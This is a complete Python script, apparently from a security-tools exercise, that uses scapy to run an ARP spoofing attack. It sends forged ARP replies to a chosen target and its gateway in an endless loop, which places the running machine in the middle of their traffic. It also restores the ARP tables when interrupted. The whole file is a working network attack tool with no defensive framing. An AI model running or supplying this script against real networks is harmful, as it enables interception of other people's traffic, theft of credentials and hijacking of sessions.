import scapy.all as scapy
import argparse
import time
import sys

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP Address", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP Address", required=True)
    args = parser.parse_args()
    return args

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

args = get_arguments()
target_ip = args.target_ip
gateway_ip = args.gateway_ip

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets Sent: {sent_packets_count}", end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP tables restored. Exiting.")
